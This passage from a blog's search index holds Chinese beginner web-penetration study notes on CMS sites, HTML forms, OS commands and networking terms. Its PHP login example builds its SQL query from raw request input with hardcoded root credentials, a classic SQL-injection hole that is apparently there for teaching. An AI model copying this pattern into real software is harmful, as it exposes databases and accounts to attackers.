<p>​            1个站点需要1个端口 65535个端口 6w多个站  实际上而言，电脑有300个站点就已经卡的不行</p>
<h3 id="不懂数据库、也不懂后端语言PHP-那我可以搭建属于自己的网站吗？"><a href="#不懂数据库、也不懂后端语言PHP-那我可以搭建属于自己的网站吗？" class="headerlink" title="不懂数据库、也不懂后端语言PHP,那我可以搭建属于自己的网站吗？"></a>不懂数据库、也不懂后端语言PHP,那我可以搭建属于自己的网站吗？</h3><p>​    cms(内容管理系统)<br>​    一键化搭建网站的源码</p>
<p>​    有些源码是有坑</p>
<p>​    <strong>通用型漏洞</strong>：一个CMS一个框架出问题，那么装了的全部得死</p>
<p>​    站长之家、A5源码也可以用</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>自动化漏扫xray</title>
    <url>/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>表单验证基础</title>
    <url>/2023/08/21/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="表单验证基础"><a href="#表单验证基础" class="headerlink" title="表单验证基础"></a>表单验证基础</h1><h2 id="表单组成"><a href="#表单组成" class="headerlink" title="表单组成"></a>表单组成</h2><h3 id="表单标签："><a href="#表单标签：" class="headerlink" title="表单标签："></a>表单标签：</h3><p>告诉别人我这里是一个表单[数据该传到那里、该用什么方式]     </p>
<form action="1.html" method="get">


        <form>
            action 数据传到那里
            method 改用什么方式串(GET / POST)
        </form>


<p>​<br>​        eg:   <form action="1.html" method="get"></p>
<h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>传参速度更快，但是会在网址(URL)中显示 问号之后 长度限制</p>
<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>没有长度限制、数据不会在URL显示</p>
<h3 id="表单域："><a href="#表单域：" class="headerlink" title="表单域："></a>表单域：</h3><p>形形色色的框     </p>
<h3 id="表单按钮："><a href="#表单按钮：" class="headerlink" title="表单按钮："></a>表单按钮：</h3><p>告诉别人我填完了</p>
<h2 id="表单验证包含-PHP-数据库-前端"><a href="#表单验证包含-PHP-数据库-前端" class="headerlink" title="表单验证包含:PHP + 数据库 + 前端"></a>表单验证包含:PHP + 数据库 + 前端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;Submit&#x27; value=&quot;登录&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//$_GET 获取GET传参</span><br><span class="line">//$_POST 获取POST传参</span><br><span class="line">//$_REQUEST 获取GET和POST传参  【他是一个数组，通过选中键值的方式选中】</span><br><span class="line"></span><br><span class="line">$username =  $_REQUEST[&#x27;username&#x27;]; //获取登陆用户名</span><br><span class="line">$password = $_REQUEST[&#x27;password&#x27;];   //获取登陆密码</span><br><span class="line">//去数据库验证用户输入的账号密码是否正确</span><br><span class="line">$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;20230209&#x27;);//我要和数据库进行链接  mysqli_connect(地址,账户，密码，库名）</span><br><span class="line">$sql = &quot;select *from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">//$sql = &#x27;select*from admin where username=&quot;&#x27;.$username.&#x27;&quot;and password =&quot;&#x27;.$password.&#x27;&quot;&#x27;;</span><br><span class="line">$a = mysqli_query($conn,$sql); //得到的结果是个对象。未来会说  数组</span><br><span class="line">$result = mysqli_fetch_array($a);  // 能用中文写代码的语言只有一个 易语言 </span><br><span class="line">if($username == $result[&quot;username&quot;] and $username != &#x27;&#x27;)&#123;</span><br><span class="line">	echo &quot;登录成功&quot;;</span><br><span class="line">&#125;else&#123;echo &quot;登录失败，账号密码错误&quot;;&#125;</span><br><span class="line">//执行数据库语句</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><p>(1)PHP文件一定要放在网站根目录(一般来说在phpstudy里的WWW)，而且后缀名正常的情况下必须是PHP </p>
<p>(2)可以混写，可以写PHP也可以写HTML  </p>
<p>(3)&lt;?php PHP内容   ?&gt;<br>    <meta charset='UTF-8'><br>    HTML代码，指定了编码格式</p>
<h3 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h3><p>​            库：多个表在一起就是库<br>​            表：xls表格<br>​            字段：列 表头<br>​            数据（行）：最终的内容。密码是123456</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>越权漏洞</title>
    <url>/2023/08/21/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>计算机基础</title>
    <url>/2023/08/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><h2 id="1-服务器系统"><a href="#1-服务器系统" class="headerlink" title="1.服务器系统"></a>1.服务器系统</h2><h3 id="1-服务器"><a href="#1-服务器" class="headerlink" title="(1)服务器"></a>(1)服务器</h3><p>是一台24小时不关机的电脑 [用来搭载服务]</p>
<h3 id="2-系统"><a href="#2-系统" class="headerlink" title="(2)系统"></a>(2)系统</h3><p>​        操作系统  </p>
<p>​        windows:微软出品系统 xp win7 win8 win10 win11<br>​        Linux:开源的系统 Kali\centos\debian<br>​            平板电脑、智能电视、安卓手机<br>​            开源：所有的代码都是公开的<br>​            闭源：我什么都不发<br>​            1、windows要钱，Linux不要钱<br>​            2、Linux对于性能要求很低<br>​                95块钱我买了一个香橙派[计算机设备]<br>​                我在上面装了一个LINUX<br>​                除了没画面，其他的都很棒<br>​            企业搭建的网站，更多的是在Linux上<br>​                Linux更加安全<br>​        MacOS:<br>​            氪金的力量（苹果系统）<br>​            像Linux的系统</p>
<h2 id="2-简单命令"><a href="#2-简单命令" class="headerlink" title="2.简单命令"></a>2.简单命令</h2><h3 id="1-cmd-命令控制台"><a href="#1-cmd-命令控制台" class="headerlink" title="1.cmd 命令控制台"></a>1.cmd 命令控制台</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user 用户名 密码 /add  添加用户</span><br><span class="line">		net user 用户名 密码 </span><br><span class="line"></span><br><span class="line">	win10为了你的安全，运行程序默认不用管理员权限</span><br><span class="line"></span><br><span class="line">	whoami 查看当前用户是啥</span><br><span class="line">	net user 查看电脑里面有什么用户</span><br><span class="line">		net user 用户名 新密码   （修改密码）</span><br><span class="line">		net user 用户名 密码 /add 添加账号</span><br><span class="line">		net user 用户名 /del 删除账号</span><br><span class="line">	net localgroup administrators 查看管理员账户</span><br><span class="line">	net localgroup administrators 用户名 /add</span><br><span class="line">	tasklist 查看当前电脑运行的程序</span><br><span class="line">	ipconfig 查看ip</span><br><span class="line">	netstat -ano 查看端口情况</span><br><span class="line">	ping 检测网络是否通 (ping www.baidu.com)</span><br><span class="line">	dir 查看文件</span><br></pre></td></tr></table></figure>
<h3 id="2-Linux命令"><a href="#2-Linux命令" class="headerlink" title="2.Linux命令"></a>2.Linux命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash命令(shell):</span><br><span class="line">	ifconfig 查看Ip</span><br><span class="line">	apt install 软件名 </span><br><span class="line">	sudo apt install 用管理员权限装软件</span><br><span class="line">	htop Linux的任务管理器</span><br><span class="line">	Linux需要切换源才能更好的使用（默认官方源）</span><br><span class="line">	ls 查看目录</span><br><span class="line">	cat 查看文件</span><br><span class="line"></span><br><span class="line">	Linux的权限比windows复杂很多</span><br><span class="line"></span><br><span class="line">		r	读取权限     4</span><br><span class="line">		w	写入权限     2	</span><br><span class="line">		X 	执行权限     1</span><br><span class="line"></span><br><span class="line">  chmod -R 权限数字  777  755  700 776   3个数字  </span><br><span class="line">    			1.文件所有者</span><br><span class="line">    			2.与文件所有者同属一个用户组的其他用户</span><br><span class="line">    			3.其它用户组</span><br></pre></td></tr></table></figure>
<h2 id="3-一些专有名词"><a href="#3-一些专有名词" class="headerlink" title="3.一些专有名词"></a>3.一些专有名词</h2><hr>
<h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p>电脑在互联网上的地址。<br>            内网(局域网)IP: 你和你的女朋友 连了同一个WIFI 用了同一个路由器<br>                只有固定范围用的IP。 我和王马老师在同一个大厦上班。701房间找我<br>                仅仅只有同一内网的人能访问到<br>                ipconfig  192.168.2.170<br>            公网(外网)IP：具体地址。  183.219.198.39  找运营商要的（1w-2w）</p>
<p>​        并不是每一个电脑都有公网ip （大部分的电脑都没有公网IP，我们能看到的公网IP，只是运营商给你暂用的<br>​        并且不是你一个人用）</p>
<p>​        因为如果你有公网IP，那么任何人都可以攻击你<br>​        24小时 =&gt; 24小时 =&gt; 几万次<br>​            1.1.1.1 - 255.255.255.255</p>
<p>​        给你一个ip你怎么知道他是内网还是公网<br>​            1、百度 本地局域网<br>​            192.168.0.0 - 192.168.255.255 内网段<br>​            172.16.0.0 - 172.16.255.255 内网段<br>​            10.0.0.0 - 10.255.255.255 内网段</p>
<hr>
<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>  www.baidu.com  www.qq.com www.163.com<br>                ip太难记了  36.152.44.95<br>                 域名的诞生就是为了好记</p>
<p>​    域名依靠的是DNS协议：（不要觉得高级）<br>​    把域名转化为IP</p>
<p>子域名：（基于顶级域名） 【同一个公司的资产】<br>                hack.zkaq.cn 靶场<br>                bbs.zkaq.cn 社区</p>
<p>​                顶级域名：zkaq.cn<br>​                二级域名：bbs.zkaq.cn<br>​                多级域名：a.c.zkaq.cn<br>​<br>​    网址不是域名 ： 网址 =&gt; 统一资源定位符(URL)<br>​    <a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=172.16.0.0&amp;fenlei=256">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=172.16.0.0&amp;fenlei=256</a></p>
<p>​        1、协议部分： https://<br>​        2、ip或者域名：www.baidu.com<br>​        3、传参和访问路径</p>
<hr>
<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>​         netstat -ano<br>​            电脑有USB口，用来插U盘、外接设备 （实体端口）<br>​            虚拟端口。 65535个端口 不同的端口做不同的事情<br>​                80端口负责网站服务 http://<br>​                443端口负责网站服务 https://</p>
<p>​        端口不是一成一变 80 http:// 任何端口都可以搞</p>
<hr>
<h3 id="Web容器"><a href="#Web容器" class="headerlink" title="Web容器"></a>Web容器</h3><p>​            搭建网站所需要的组件<br>​            三个比较常见：<br>​        apahce 任意跨平台<br>​        nginx  任意跨平台<br>​        iis  是微软开发的，微软生态，只有windows能用</p>
<p>​        B/S 浏览器/服务器的交互 HTTP 协议名字://<br>​        C/S 客户端/服务器的交互 非HTTP</p>
<p>​        绝大部分的漏洞都是代码的错误，而不是协议的问题</p>
<p>​        web容器：很被动的东西，她没有的任何的主观能动性</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>验证码绕过,密码找回</title>
    <url>/2023/08/21/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
